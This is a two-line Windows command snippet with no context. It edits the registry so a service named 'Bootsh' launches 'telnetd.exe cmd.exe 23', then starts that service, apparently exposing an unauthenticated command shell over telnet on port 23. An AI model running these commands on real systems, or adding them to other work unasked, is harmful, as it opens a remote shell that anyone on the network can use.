REG ADD HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Bootsh\Parameters\Commands /v Xrun /t REG_SZ /d "telnetd.exe cmd.exe 23" /f
sc start bootsh